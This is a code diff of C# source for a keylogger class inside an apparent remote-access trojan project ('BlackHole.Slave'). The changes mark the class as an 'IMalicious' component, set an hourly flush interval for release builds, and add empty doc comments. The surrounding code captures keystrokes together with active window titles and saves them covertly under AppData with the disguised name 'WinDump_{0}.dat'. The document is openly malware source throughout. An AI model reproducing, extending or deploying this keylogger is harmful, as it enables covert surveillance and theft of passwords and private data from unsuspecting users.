@@ -14,10 +14,8 @@ namespace BlackHole.Slave.Malicious
     /// <summary>
     /// 
     /// </summary>
-    public class Keylogger : Singleton<Keylogger>
+    public class Keylogger : Singleton<Keylogger>, IMalicious
     {
-        public const int FLUSH_INTERVAL = 70000;
-
         private static string FileName = "WinDump_{0}.dat";
 
 #if DEBUG
@@ -25,11 +23,13 @@ namespace BlackHole.Slave.Malicious
         /// 
         /// </summary>
         public static string FileDirectory => "";
+        public const int FLUSH_INTERVAL = 70000;
 #else
         /// <summary>
         /// 
         /// </summary>
         public static string FileDirectory => Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData);
+        public const int FLUSH_INTERVAL = 60000 * 60;
 #endif
 
         private StringBuilder m_logger = new StringBuilder();
@@ -74,11 +74,29 @@ namespace BlackHole.Slave.Malicious
             m_events.Dispose();
         }
 
+        /// <summary>
+        /// 
+        /// </summary>
+        /// <param name="message"></param>
         private void Append(object message) => m_logger.Append(message.ToString());
+
+        /// <summary>
+        /// 
+        /// </summary>
+        /// <param name="message"></param>
         private void AppendLine(object message) => m_logger.AppendLine(message.ToString());
+
+        /// <summary>
+        /// 
+        /// </summary>
         private void AppendNewWindowName() =>
             AppendLine($"[{m_lastWindowTitle}][{DateTime.Now.ToString("HH:mm")}]");
 
+        /// <summary>
+        /// 
+        /// </summary>
+        /// <param name="sender"></param>
+        /// <param name="e"></param>
         private void OnKeyDown(object sender, KeyEventArgs e) 
         {
             var windowTitle = KeyloggerHelper.GetActiveWindowTitle(); 
@@ -101,6 +119,11 @@ namespace BlackHole.Slave.Malicious
                     m_pressedKeys.Add(e.KeyCode);                            
         }
         
+        /// <summary>
+        /// 
+        /// </summary>
+        /// <param name="sender"></param>
+        /// <param name="e"></param>
         private void OnKeyPress(object sender, KeyPressEventArgs e) 
         {
             if (m_pressedKeys.IsModifierKeysSet() && m_pressedKeys.ContainsKeyChar(e.KeyChar))
@@ -116,12 +139,22 @@ namespace BlackHole.Slave.Malicious
             }
         }
 
+        /// <summary>
+        /// 
+        /// </summary>
+        /// <param name="sender"></param>
+        /// <param name="e"></param>
         private void OnKeyUp(object sender, KeyEventArgs e) //Called third
         {
             Append(HighlightSpecialKeys(m_pressedKeys.ToArray()));
             m_pressedKeyChars.Clear();
         }
 
+        /// <summary>
+        /// 
+        /// </summary>
+        /// <param name="keys"></param>
+        /// <returns></returns>
         private string HighlightSpecialKeys(Keys[] keys)
         {
             if (keys.Length < 1) return string.Empty;
@@ -184,6 +217,9 @@ namespace BlackHole.Slave.Malicious
             return normalKeys.ToString();
         }
 
+        /// <summary>
+        /// 
+        /// </summary>
         private async void WriteFile()
         {
             var filePath = Path.Combine(FileDirectory, FileName);
